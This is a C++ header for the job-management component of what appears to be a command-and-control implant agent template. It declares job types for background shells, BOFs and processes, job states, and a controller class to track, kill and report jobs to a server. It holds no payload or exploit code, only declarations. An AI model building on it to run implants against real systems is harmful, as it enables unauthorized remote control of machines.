// __NAME__ Agent — Jobs Controller (Stub)
//
// Manages async jobs (long-running tasks: BOF async, shells, tunnels, etc.)
// that execute in background threads and report status/output asynchronously.
//
// Each job has a unique ID, a type, a state, and an optional stop event
// to signal cancellation.

#pragma once

#ifdef _WIN32
#include <winsock2.h>
#endif
#include <windows.h>
#include <stdint.h>

// ── Job types (must match server-side pl_utils.go JOB_TYPE_*) ──────────────────

#define JOB_TYPE_LOCAL    0x1
#define JOB_TYPE_REMOTE   0x2
#define JOB_TYPE_PROCESS  0x3
#define JOB_TYPE_SHELL    0x4
#define JOB_TYPE_BOF      0x5

// ── Job states ─────────────────────────────────────────────────────────────────

#define JOB_STATE_STARTING  0x0
#define JOB_STATE_RUNNING   0x1
#define JOB_STATE_FINISHED  0x2
#define JOB_STATE_KILLED    0x3

// ── Job entry ──────────────────────────────────────────────────────────────────

typedef struct {
    ULONG  jobId;
    ULONG  jobType;
    ULONG  state;
    HANDLE hThread;
    DWORD  threadId;
    HANDLE hStopEvent;   // Signaled to request graceful cancellation
} Job;

// ── JobsController ─────────────────────────────────────────────────────────────

class JobsController
{
private:
    Job*    jobs;
    int     jobCount;
    int     jobCapacity;
    ULONG   nextId;

    CRITICAL_SECTION lock;

public:
    JobsController();
    ~JobsController();

    // Add a new job. Returns the assigned job ID.
    ULONG Add(ULONG jobType, HANDLE hThread, DWORD threadId, HANDLE hStopEvent);

    // Remove a finished/killed job by ID. Returns TRUE if found.
    BOOL Remove(ULONG jobId);

    // Find a job by ID. Returns the Job pointer or nullptr.
    Job* Find(ULONG jobId);

    // Kill a job by ID: signal the stop event and wait for thread exit.
    BOOL Kill(ULONG jobId);

    // Collect all job entries for reporting to the server.
    // Caller must free the returned array.
    int List(Job** outJobs);

    // Check for finished jobs and clean up their resources.
    void Reap();
};
